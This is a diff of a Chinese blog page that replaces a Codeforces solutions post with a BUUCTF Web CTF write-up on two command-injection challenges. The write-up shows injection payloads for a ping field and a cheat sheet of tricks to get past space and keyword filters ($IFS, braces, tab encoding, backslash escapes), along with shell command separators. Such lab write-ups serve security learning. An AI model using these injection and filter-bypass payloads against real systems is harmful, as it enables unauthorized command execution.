@@ -19,30 +19,37 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"coperlm.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="题目链接 逆天抽象局，ab都是构造题，  A. Find K Distinct Points with Fixed Center 12345678910111213141516171819202122232425#include&lt;iostream&gt;#define int long longusing namespace std;int t , x , y , k;signed">
+    <meta name="description" content="[ACTF2020 新生赛]Exec 输入127.0.0.1;ls  发现真的把 index.php（也就是ls的操作结果）真的输出了，说明没有过滤分号 最终在127.0.0.1;cd ..&#x2F;..&#x2F;..&#x2F;;ls找到了flag文件  输入127.0.0.1;cd ..&#x2F;..&#x2F;..&#x2F;;ls得到flag  flag:flag{4e3b851f-9a72-42c9-a57a-d66985">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Codeforces Round 965 (Div. 2) 题解">
-<meta property="og:url" content="https://coperlm.github.io/2024/08/11/Codeforces-Round-965-Div-2-%E9%A2%98%E8%A7%A3/index.html">
+<meta property="og:title" content="BUUCTF Web wp">
+<meta property="og:url" content="https://coperlm.github.io/2024/08/16/BUUCTF-Web-wp/index.html">
 <meta property="og:site_name" content="素衣莫起风尘叹，犹及清明可到家">
-<meta property="og:description" content="题目链接 逆天抽象局，ab都是构造题，  A. Find K Distinct Points with Fixed Center 12345678910111213141516171819202122232425#include&lt;iostream&gt;#define int long longusing namespace std;int t , x , y , k;signed">
+<meta property="og:description" content="[ACTF2020 新生赛]Exec 输入127.0.0.1;ls  发现真的把 index.php（也就是ls的操作结果）真的输出了，说明没有过滤分号 最终在127.0.0.1;cd ..&#x2F;..&#x2F;..&#x2F;;ls找到了flag文件  输入127.0.0.1;cd ..&#x2F;..&#x2F;..&#x2F;;ls得到flag  flag:flag{4e3b851f-9a72-42c9-a57a-d66985">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://coperlm.github.io/2024/08/11/Codeforces-Round-965-Div-2-%E9%A2%98%E8%A7%A3/image-20240811110838813.png">
-<meta property="article:published_time" content="2024-08-11T03:02:58.000Z">
-<meta property="article:modified_time" content="2024-08-11T06:02:25.560Z">
+<meta property="og:image" content="https://coperlm.github.io/2024/08/16/BUUCTF-Web-wp/image-20240816141656487.png">
+<meta property="og:image" content="https://coperlm.github.io/2024/08/16/BUUCTF-Web-wp/image-20240816141854210.png">
+<meta property="og:image" content="https://coperlm.github.io/2024/08/16/BUUCTF-Web-wp/image-20240816141948311.png">
+<meta property="og:image" content="https://coperlm.github.io/2024/08/16/BUUCTF-Web-wp/image-20240816165534905.png">
+<meta property="og:image" content="https://coperlm.github.io/2024/08/16/BUUCTF-Web-wp/image-20240816165620729.png">
+<meta property="og:image" content="https://coperlm.github.io/2024/08/16/BUUCTF-Web-wp/image-20240816170242335.png">
+<meta property="og:image" content="https://coperlm.github.io/2024/08/16/BUUCTF-Web-wp/image-20240816171040850.png">
+<meta property="og:image" content="https://coperlm.github.io/2024/08/16/BUUCTF-Web-wp/image-20240816171951521.png">
+<meta property="article:published_time" content="2024-08-16T05:14:38.000Z">
+<meta property="article:modified_time" content="2024-08-16T11:16:02.122Z">
 <meta property="article:author" content="coperlm">
-<meta property="article:tag" content="算法竞赛">
+<meta property="article:tag" content="none">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://coperlm.github.io/2024/08/11/Codeforces-Round-965-Div-2-%E9%A2%98%E8%A7%A3/image-20240811110838813.png">
+<meta name="twitter:image" content="https://coperlm.github.io/2024/08/16/BUUCTF-Web-wp/image-20240816141656487.png">
 
 
-<link rel="canonical" href="https://coperlm.github.io/2024/08/11/Codeforces-Round-965-Div-2-%E9%A2%98%E8%A7%A3/">
+<link rel="canonical" href="https://coperlm.github.io/2024/08/16/BUUCTF-Web-wp/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://coperlm.github.io/2024/08/11/Codeforces-Round-965-Div-2-%E9%A2%98%E8%A7%A3/","path":"2024/08/11/Codeforces-Round-965-Div-2-题解/","title":"Codeforces Round 965 (Div. 2) 题解"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://coperlm.github.io/2024/08/16/BUUCTF-Web-wp/","path":"2024/08/16/BUUCTF-Web-wp/","title":"BUUCTF Web wp"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>Codeforces Round 965 (Div. 2) 题解 | 素衣莫起风尘叹，犹及清明可到家</title>
+<title>BUUCTF Web wp | 素衣莫起风尘叹，犹及清明可到家</title>
   
 
 
@@ -210,7 +217,7 @@ mjx-container[display="true"] + br {
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           Table of Contents
@@ -223,6 +230,7 @@ mjx-container[display="true"] + br {
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bexec"><span class="nav-number">1.</span> <span class="nav-text">[ACTF2020 新生赛]Exec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gxyctf2019ping-ping-ping"><span class="nav-number">2.</span> <span class="nav-text">[GXYCTF2019]Ping Ping Ping</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -267,7 +275,7 @@ mjx-container[display="true"] + br {
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://coperlm.github.io/2024/08/11/Codeforces-Round-965-Div-2-%E9%A2%98%E8%A7%A3/">
+    <link itemprop="mainEntityOfPage" href="https://coperlm.github.io/2024/08/16/BUUCTF-Web-wp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -280,12 +288,12 @@ mjx-container[display="true"] + br {
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="Codeforces Round 965 (Div. 2) 题解 | 素衣莫起风尘叹，犹及清明可到家">
+      <meta itemprop="name" content="BUUCTF Web wp | 素衣莫起风尘叹，犹及清明可到家">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Codeforces Round 965 (Div. 2) 题解
+          BUUCTF Web wp
         </h1>
 
         <div class="post-meta-container">
@@ -297,7 +305,7 @@ mjx-container[display="true"] + br {
       <span class="post-meta-item-text">Posted on</span>
       
 
-      <time title="Created: 2024-08-11 11:02:58 / Modified: 14:02:25" itemprop="dateCreated datePublished" datetime="2024-08-11T11:02:58+08:00">2024-08-11</time>
+      <time title="Created: 2024-08-16 13:14:38 / Modified: 19:16:02" itemprop="dateCreated datePublished" datetime="2024-08-16T13:14:38+08:00">2024-08-16</time>
     </span>
 
   
@@ -309,17 +317,33 @@ mjx-container[display="true"] + br {
     
     
     
-    <div class="post-body" itemprop="articleBody"><p><a target="_blank" rel="noopener" href="https://codeforces.com/contest/1998">题目链接</a></p>
-<p>逆天抽象局，ab都是构造题，</p>
-<p><img src="/2024/08/11/Codeforces-Round-965-Div-2-%E9%A2%98%E8%A7%A3/image-20240811110838813.png"></p>
-<p><a target="_blank" rel="noopener" href="https://codeforces.com/contest/1998/problem/A">A. Find K
-Distinct Points with Fixed Center</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#define int long long</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int t , x , y , k;</span><br><span class="line">signed main(){</span><br><span class="line">    cin &gt;&gt; t;</span><br><span class="line">    while( t -- ){</span><br><span class="line">        cin &gt;&gt; x &gt;&gt; y &gt;&gt; k;</span><br><span class="line">        if( k % 2 ){</span><br><span class="line">            cout &lt;&lt; x &lt;&lt; " " &lt;&lt; y &lt;&lt; endl;</span><br><span class="line">            for(int i = 1;i &lt;= (k-1)/2;i ++){</span><br><span class="line">                cout &lt;&lt; x-i &lt;&lt; " " &lt;&lt; y &lt;&lt; endl;</span><br><span class="line">                cout &lt;&lt; x+i &lt;&lt; " " &lt;&lt; y &lt;&lt; endl;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        else{</span><br><span class="line">            for(int i = 1;i &lt;= k/2;i ++){</span><br><span class="line">                cout &lt;&lt; x-i &lt;&lt; " " &lt;&lt; y &lt;&lt; endl;</span><br><span class="line">                cout &lt;&lt; x+i &lt;&lt; " " &lt;&lt; y &lt;&lt; endl;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    return 0;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
-<p><a target="_blank" rel="noopener" href="https://codeforces.com/contest/1998/problem/B">B. Minimize
-Equal Sum Subarrays</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#define int long long</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">const int N = 2e5;</span><br><span class="line">int n;</span><br><span class="line">int a[N+10];</span><br><span class="line"></span><br><span class="line">signed main(){</span><br><span class="line">    int t;cin &gt;&gt; t;</span><br><span class="line">    while( t -- ){</span><br><span class="line">        cin &gt;&gt; n;</span><br><span class="line">        for(int i = 1;i &lt;= n;i ++){</span><br><span class="line">            cin &gt;&gt; a[i];</span><br><span class="line">        }</span><br><span class="line">        for(int i = 2;i &lt;= n;i ++){</span><br><span class="line">            cout &lt;&lt; a[i] &lt;&lt; " ";</span><br><span class="line">        }cout &lt;&lt; a[1] &lt;&lt; endl;</span><br><span class="line">    }</span><br><span class="line">    return 0;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
-<p><a target="_blank" rel="noopener" href="https://codeforces.com/contest/1998/problem/C">C. Perform
-Operations to Maximize Score</a></p>
+    <div class="post-body" itemprop="articleBody"><h3 id="actf2020-新生赛exec">[ACTF2020 新生赛]Exec</h3>
+<p>输入<code>127.0.0.1;ls</code></p>
+<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816141656487.png"></p>
+<p>发现真的把
+<code>index.php</code>（也就是<code>ls</code>的操作结果）真的输出了，说明没有过滤分号</p>
+<p>最终在<code>127.0.0.1;cd ../../../;ls</code>找到了flag文件</p>
+<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816141854210.png"></p>
+<p>输入<code>127.0.0.1;cd ../../../;ls</code>得到flag</p>
+<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816141948311.png"></p>
+<p>flag:<code>flag{4e3b851f-9a72-42c9-a57a-d6698548cdc0}</code></p>
+<h3 id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping</h3>
+<p>发现有一个<code>/?ip=</code></p>
+<p>根据上一题的经验，我们输入<code>/?ip=127.0.0.1;ls</code>，得到</p>
+<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816165534905.png"></p>
+<p>得知不能输入空格</p>
+<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816165620729.png"></p>
+<p>所以我们需要绕过空格使用一下平替</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">${IFS}$9</span><br><span class="line">{IFS}</span><br><span class="line">$IFS</span><br><span class="line">${IFS}</span><br><span class="line">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class="line">IFS</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">{cat,flag.php}  //用逗号实现了空格功能，需要用{}括起来</span><br><span class="line">%20   (space)</span><br><span class="line">%09   (tab)</span><br><span class="line">X=$'cat\x09./flag.php';$X       （\x09表示tab，也可以用\x20）</span><br></pre></td></tr></table></figure>
+<p>输入<code>/?ip=127.0.0.1;cat$IFS1flag.php</code></p>
+<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816170242335.png"></p>
+<p>我们查看index.php</p>
+<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816171040850.png"></p>
+<p>使用 <code>/?ip=127.0.0.1;e=g;cat$IFS$1fla$e.php</code></p>
+<p>F12即可得到flag</p>
+<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816171951521.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">;     前面的执行完执行后面的</span><br><span class="line">|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         </span><br><span class="line">||    当前面的执行出错时（为假）执行后面的</span><br><span class="line">&amp;     将任务置于后台执行</span><br><span class="line">&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真</span><br><span class="line">%0a  （换行）</span><br><span class="line">%0d  （回车）</span><br><span class="line">---</span><br><span class="line">ps:有时会禁用cat:</span><br><span class="line">解决方法是使用tac反向输出命令：</span><br><span class="line">linux命令中可以加\，所以甚至可以ca\t /fl\ag</span><br><span class="line">---</span><br><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br><span class="line">$IFS在Linux下表示为空格</span><br><span class="line">$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字</span><br><span class="line">这里$IFS$9或$IFS垂直，后面加个$与{}类似，起截断作用</span><br></pre></td></tr></table></figure>
+<p>flag:<code>flag{ef88dbb0-2c4d-4489-9fdb-02ce4c5d6fa1}</code></p>
 
     </div>
 
@@ -329,20 +353,20 @@ Operations to Maximize Score</a></p>
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/" rel="tag"># 算法竞赛</a>
+              <a href="/tags/none/" rel="tag"># none</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2024/08/10/%E9%A3%9E%E8%A1%8C%E5%99%A8%E7%A9%BA%E6%B0%94%E5%8A%A8%E5%8A%9B%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BD%8E%E9%80%9F%E7%BF%BC%E5%9E%8B%EF%BC%89/" rel="prev" title="飞行器空气动力学学习笔记（低速翼型）">
-                  <i class="fa fa-angle-left"></i> 飞行器空气动力学学习笔记（低速翼型）
+                <a href="/2024/08/13/BUUCTF-RE-wp/" rel="prev" title="BUUCTF RE wp">
+                  <i class="fa fa-angle-left"></i> BUUCTF RE wp
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2024/08/13/%E5%8E%A6%E5%A4%A7%E4%B8%80%E6%97%A5%E6%B8%B8%EF%BC%88%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%A4%A7%E8%B5%9B%EF%BC%89/" rel="next" title="厦大一日游（机器人大赛）">
-                  厦大一日游（机器人大赛） <i class="fa fa-angle-right"></i>
+                <a href="/2024/08/17/MoeCTF2024%E7%AC%AC%E4%BA%8C%E5%91%A8-wp/" rel="next" title="MoeCTF2024第二周 wp">
+                  MoeCTF2024第二周 wp <i class="fa fa-angle-right"></i>
                 </a>
             </div>
           </div>
